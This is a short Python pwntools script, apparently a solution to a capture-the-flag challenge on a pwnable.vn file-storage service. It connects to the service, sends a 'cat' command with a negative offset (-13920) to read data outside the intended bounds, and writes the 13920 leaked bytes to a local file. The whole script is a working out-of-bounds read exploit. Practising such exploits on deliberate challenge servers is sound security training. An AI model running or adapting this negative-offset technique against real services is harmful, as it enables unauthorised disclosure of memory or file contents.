from pwn import *

io = remote("file_storage.pwnable.vn", 10000)
results = io.recvuntil(b"\n> ", timeout=1)
print(results.decode("utf-8"))

offset = -13920
length = 13920
cat = f"cat lorem {offset} {length}"
io.sendline(cat.encode("utf-8"))
data = io.recvn(13920)
file = open("output.txt", "wb")

# Write the data to the file
file.write(data)